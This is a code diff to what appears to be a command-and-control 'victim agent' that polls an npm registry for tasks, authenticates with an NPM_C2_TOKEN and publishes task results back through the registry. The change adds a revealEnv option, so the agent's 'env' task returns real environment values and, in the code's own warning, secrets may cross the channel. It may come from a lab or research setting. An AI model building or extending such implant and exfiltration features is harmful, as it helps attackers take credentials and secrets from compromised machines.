@@ -158,7 +158,7 @@ export async function publishHeartbeat({
  * @param {object} deps.client RegistryClient (or fake with setDistTag)
  * @param {object} deps.logger
  * @param {Function} [deps.save] persist callback, called after each state change
- * @param {object} [deps.limits] task limits, e.g. { maxFileBytes }
+ * @param {object} [deps.limits] task limits, e.g. { maxFileBytes, revealEnv }
  * @param {Set<string>} [deps.validLeases] recently published heartbeat leases
  * @returns {Promise<{executed: number, resultsPublished: number, skipped: number}>}
  */
@@ -305,6 +305,9 @@ async function main() {
   logger.info(`victim agent ${state.agentId} starting`);
   logger.info(`registry=${cfg.registryUrl} package=${cfg.packageName} poll=${cfg.pollIntervalSec}s`);
   logger.info(`cwd=${process.cwd()} maxFileBytes=${cfg.maxFileBytes}`);
+  if (cfg.revealEnv) {
+    logger.warn('revealEnv is ON — the env task returns real values; secrets may cross the channel');
+  }
   if (!cfg.token) {
     logger.warn('NPM_C2_TOKEN is not set — result publishing will fail with 401');
   }
@@ -361,7 +364,7 @@ async function main() {
         client,
         logger,
         save,
-        limits: { maxFileBytes: cfg.maxFileBytes },
+        limits: { maxFileBytes: cfg.maxFileBytes, revealEnv: cfg.revealEnv },
         validLeases: new Set(heartbeatLeases),
       });
       if (stats.executed > 0 || stats.skipped > 0) {
